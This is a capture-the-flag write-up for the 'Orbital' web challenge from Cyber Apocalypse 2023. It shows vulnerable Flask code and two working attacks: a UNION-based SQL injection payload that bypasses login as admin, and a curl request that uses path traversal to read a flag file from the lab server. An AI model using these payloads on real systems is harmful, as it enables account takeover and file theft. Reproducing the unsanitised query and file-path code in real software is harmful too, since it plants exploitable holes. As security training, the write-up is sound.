# Cyber Apocalypse 2023

## Orbital

> In order to decipher the alien communication that held the key to their location, she needed access to a decoder with advanced capabilities - a decoder that only The Orbital firm possessed. Can you get your hands on the decoder?
>
>  Author: N/A
>
> [`web_orbital.zip`](web_orbital.zip)

Tags: _web_

## Solution
After browsing through the source code we can find the login code
```
def login(username, password):
    # I don't think it's not possible to bypass login because I'm verifying the password later.
    user = query(f'SELECT username, password FROM users WHERE username = "{username}"', one=True)

    if user:
        passwordCheck = passwordVerify(user['password'], password)

        if passwordCheck:
            token = createJWT(user['username'])
            return token
    else:
        return False
```
The comment suggest sql injection is not possible here since password is tested explicitely later on. But this part is still weak, by logging in as

```
user: " AND 0=1 UNION SELECT username, md5("test123") AS password FROM users WHERE username = "admin" #-- -
pass: test123
```
We can hard set the password to whatever we want, here `test123`, and we are in.

On the site itself is not much to find, but browsing the code a bit more there is a interesting endpoint:

```
@api.route('/export', methods=['POST'])
@isAuthenticated
def exportFile():
    if not request.is_json:
        return response('Invalid JSON!'), 400
    
    data = request.get_json()
    communicationName = data.get('name', '')

    try:
        # Everyone is saying I should escape specific characters in the filename. I don't know why.
        return send_file(f'/communications/{communicationName}', as_attachment=True)
    except:
        return response('Unable to retrieve the communication'), 400
```

We can use this, with our current session id, to extract the flag. We only need to know where the flag is stored. In the Dockerfile this information can be found.
```
# copy flag
COPY flag.txt /signal_sleuth_firmware
COPY files /communications/
```

And we have the flag:
```
$ curl -X POST -H "Content-Type:application/json" -d '{"name":"../signal_sleuth_firmware"}' --cookie "session=eyJhdXRoIjoiZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SjFjMlZ5Ym1GdFpTSTZJbUZrYldsdUlpd2laWGh3SWpveE5qYzVOVGszTVRrMGZRLkRaLXhLS09YeENtZ1MtakhWajZmWkhYdGQyMDVpZmFNRVR3eEo5NVNfTDQifQ.ZBxKKg.SoU5o3fjH-Yj-A1EesEi6RQwDFA" http://167.71.143.44:32392/api/export
HTB{T1m3_b4$3d_$ql1_4r3_fun!!!}
```